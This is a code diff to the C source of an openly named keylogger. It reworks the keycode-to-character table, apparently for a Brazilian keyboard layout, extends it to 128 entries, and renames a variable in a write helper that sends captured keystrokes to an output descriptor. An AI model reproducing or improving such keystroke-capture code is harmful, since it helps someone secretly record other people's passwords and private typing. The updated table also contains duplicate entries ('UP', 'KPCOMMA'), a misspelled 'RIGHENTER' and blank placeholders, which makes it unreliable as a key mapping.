@@ -7,7 +7,7 @@
 #include "keylogger.h"
 
 #define BUFFER_SIZE 100
-#define NUM_KEYCODES 71
+#define NUM_KEYCODES 128
 
 const char *keycodes[] = {
     "RESERVED",
@@ -22,48 +22,48 @@ const char *keycodes[] = {
     "8",
     "9",
     "0",
-    "MINUS",
-    "EQUAL",
+    "-",
+    "=",
     "BACKSPACE",
     "TAB",
-    "Q",
-    "W",
-    "E",
-    "R",
-    "T",
-    "Y",
-    "U",
-    "I",
-    "O",
-    "P",
-    "LEFTBRACE",
-    "RIGHTBRACE",
+    "q",
+    "w",
+    "e",
+    "r",
+    "t",
+    "y",
+    "u",
+    "i",
+    "o",
+    "p",
+    "´",
+    "[",
     "ENTER",
     "LEFTCTRL",
-    "A",
-    "S",
-    "D",
-    "F",
-    "G",
-    "H",
-    "J",
-    "K",
-    "L",
-    "SEMICOLON",
+    "a",
+    "s",
+    "d",
+    "f",
+    "g",
+    "h",
+    "j",
+    "k",
+    "l",
+    "ç",
+    "~",
     "APOSTROPHE",
-    "GRAVE",
     "LEFTSHIFT",
-    "BACKSLASH",
-    "Z",
-    "X",
-    "C",
-    "V",
-    "B",
-    "N",
-    "M",
-    "COMMA",
-    "DOT",
-    "SLASH",
+    "]",
+    "z",
+    "x",
+    "c",
+    "v",
+    "b",
+    "n",
+    "m",
+    ",",
+    ".",
+    ";",
     "RIGHTSHIFT",
     "KPASTERISK",
     "LEFTALT",
@@ -80,7 +80,64 @@ const char *keycodes[] = {
     "F9",
     "F10",
     "NUMLOCK",
-    "SCROLLLOCK"};
+    "SCROLLLOCK",
+    "KP7",
+    "KP8",
+    "KP9",
+    "KPMINUS",
+    "KP4",
+    "KP5",
+    "KP6",
+    "KPPLUS",
+    "KP1",
+    "KP2",
+    "KP3",
+    "KP0",
+    "KPCOMMA",
+    " ",
+    " ",
+    "BACKSLASH",
+    "F11",
+    "F12",
+    "SLASH",
+    " ",
+    " ",
+    " ",
+    " ",
+    "KPJPCOMMA",
+    "KPENTER",
+    "RIGHENTER",
+    "RIGHTALT",
+    "KPSLASH",
+    "SYSRQ",
+    "ALTGR",
+    "UP",
+    "HOME",
+    "UP",
+    "PAGEUP",
+    "LEFT",
+    "RIGHT",
+    "END",
+    "DOWN",
+    "PAGEDOWN",
+    "MACRO",
+    "DELETE",
+    "VOLUMEDOWN",
+    "VOLUMEUP",
+    "POWER",
+    "KPEQUAL",
+    "TURNOFF",
+    "KPCOMMA",
+    " ",
+    " ",
+    " ",
+    " ",
+    " ",
+    " ",
+    " ",
+    "WIN",
+    " ",
+    "MENU"};
 
 int loop = 1;
 
@@ -121,12 +178,12 @@ int write_all(int file_desc, const char *str)
  */
 void safe_write_all(int file_desc, const char *str, int keyboard)
 {
-  struct sigaction new_actn, old_actn;
+  struct sigaction new_actn, old_actns;
   new_actn.sa_handler = SIG_IGN;
   sigemptyset(&new_actn.sa_mask);
   new_actn.sa_flags = 0;
 
-  sigaction(SIGPIPE, &new_actn, &old_actn);
+  sigaction(SIGPIPE, &new_actn, &old_actns);
 
   if (!write_all(file_desc, str))
   {
@@ -136,7 +193,7 @@ void safe_write_all(int file_desc, const char *str, int keyboard)
     exit(1);
   }
 
-  sigaction(SIGPIPE, &old_actn, NULL);
+  sigaction(SIGPIPE, &old_actns, NULL);
 }
 
 void keylogger(int keyboard, int writeout)
